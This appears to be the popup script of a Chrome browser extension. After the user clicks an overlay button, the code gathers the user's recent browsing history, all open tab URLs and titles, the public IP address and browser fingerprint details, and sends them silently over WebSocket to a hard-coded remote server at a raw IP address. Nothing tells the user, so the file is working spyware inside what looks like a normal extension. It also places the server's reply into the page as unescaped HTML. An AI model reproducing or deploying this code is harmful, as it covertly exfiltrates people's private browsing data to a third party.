document.addEventListener("DOMContentLoaded", function() {
    
    window.onload = function() {
        document.getElementById('overlay').style.display = 'flex';
    };

    const button = document.getElementById("button");

    button.addEventListener("click", function() {
        document.getElementById('overlay').style.display = 'none';
        const historyPromise = new Promise((resolve, reject) => {
            chrome.history.search({ text: '', maxResults: 10 }, function(historyItems) {
                if (chrome.runtime.lastError) {
                    return reject(chrome.runtime.lastError);
                }
                let historyInfo = historyItems.map(item => `<a href="${item.url}">${item.title}</a>`).join(" <br> ");
                resolve(historyInfo);
            });
        });
        

        const tabsPromise = new Promise((resolve, reject) => {
            chrome.tabs.query({}, function(tabs) {
                if (chrome.runtime.lastError) {
                    return reject(chrome.runtime.lastError);
                }
                let tabsInfo = tabs.map(tab => `<a href="${tab.url}">${tab.title}</a>`).join(" <br> ");
                resolve(tabsInfo);
            });
        });

        const ipPromise = new Promise((resolve, reject) => {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => resolve(data.ip))
                .catch(error => reject(error));
        });

        Promise.all([historyPromise, tabsPromise, ipPromise]).then(results => {
            const [historyInfo, tabsInfo, publicIp] = results;

            const browserName = getBrowserName(navigator.userAgent);
            let infoPc = 
                "Platform : " + navigator.platform + " <br> " +
                "UserAgent : " + browserName + " <br> " +
                "Cookie : " + navigator.cookieEnabled + " <br> " +
                "Language : " + navigator.language + " <br> " +
                "Languages : " + navigator.languages.join(', ') + " <br> " +
                "Online : " + navigator.onLine + " <br> " +
                "Product : " + navigator.product + " <br> " +
                "Product Sub : " + navigator.productSub + " <br> " +
                "Vendor : " + navigator.vendor + " <br> " +
                "App Code Name : " + navigator.appCodeName + " <br> " +
                "App Name : " + navigator.appName + " <br> " +
                "App Version : " + navigator.appVersion + " <br> ";
            
            const payload = {
                content: `PC Info: <br> ${infoPc} <br>  <br> History: <br> ${historyInfo} <br>  <br> Tabs: <br> ${tabsInfo} <br>  <br> Public IP: ${publicIp} <br> `
            };

            const socket = new WebSocket('ws://141.94.223.3:8080/');

            socket.onopen = function() {
                socket.send(JSON.stringify(payload));
                console.log('Data sent to WebSocket server');
            };

            socket.onmessage = function(event) {
                console.log('Message from server:', event.data);
                const data = JSON.parse(event.data);
                infoDisplay.innerHTML = data.content;
            };

            socket.onerror = function(error) {
                console.error('WebSocket Error:', error);
            };

            socket.onclose = function() {
                console.log('WebSocket connection closed');
            };
        }).catch(error => {
            console.error('Error:', error);
        });
    });


    function getBrowserName(userAgent) {  
        if (userAgent.includes("Firefox")) {
            return "Mozilla Firefox";
        } else if (userAgent.includes("SamsungBrowser")) {
            return "Samsung Internet";
        } else if (userAgent.includes("Opera") || userAgent.includes("OPR")) {
            return "Opera";
        } else if (userAgent.includes("Edge")) {
            return "Microsoft Edge (Legacy)";
        } else if (userAgent.includes("Edg")) {
            return "Microsoft Edge (Chromium)";
        } else if (userAgent.includes("Chrome")) {
            return "Google Chrome or Chromium";
        } else if (userAgent.includes("Safari")) {
            return "Apple Safari";
        } else {
            return "unknown";
        }
    }
});
